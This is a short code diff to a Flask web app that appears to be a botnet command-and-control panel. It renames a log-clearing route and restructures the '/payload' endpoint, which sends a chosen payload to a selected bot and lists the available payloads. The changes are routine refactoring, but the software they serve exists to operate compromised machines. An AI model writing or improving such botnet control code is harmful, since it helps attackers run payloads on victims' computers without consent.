@@ -119,7 +119,7 @@ def kill_proc():
 
 @app.route('/clear', methods=['POST','GET'])
 @login_required
-def clearLog():
+def clear_log():
     if 'bot' in request.cookies:
         botnet.clearLog(request.cookies.get('bot'))
         return json.dumps({"success": True})
@@ -190,15 +190,18 @@ def download_file():
 @app.route('/payload', methods=['GET', 'POST'])
 @login_required
 def payload_launch():
-    if request.method == 'POST' and 'payload' in request.form:
-        payload_name = request.form.get('payload')
-        if 'bot' in request.form:
-            botnet.sendPayload(request.form.get('bot'), payload_name, request.form.to_dict())
-        elif 'bot' in request.cookies:
-            botnet.sendPayload(request.cookies.get('bot'), payload_name, request.form.to_dict())
+    if request.method == 'POST':
+        if 'payload' in request.form:
+            payload_name = request.form.get('payload')
+            if 'bot' in request.form:
+                botnet.sendPayload(request.form.get('bot'), payload_name, request.form.to_dict())
+            elif 'bot' in request.cookies:
+                botnet.sendPayload(request.cookies.get('bot'), payload_name, request.form.to_dict())
+            else:
+                return "No bot selected", 404
+            return "done"
         else:
-            return "No bot selected", 404
-        return "done"
+            return "No payload specified", 404
     elif request.method == 'GET':
         payloadstr = json.dumps(botnet.getPayloads())
         return flask.Response(payloadstr, status=200, mimetype='application/json')
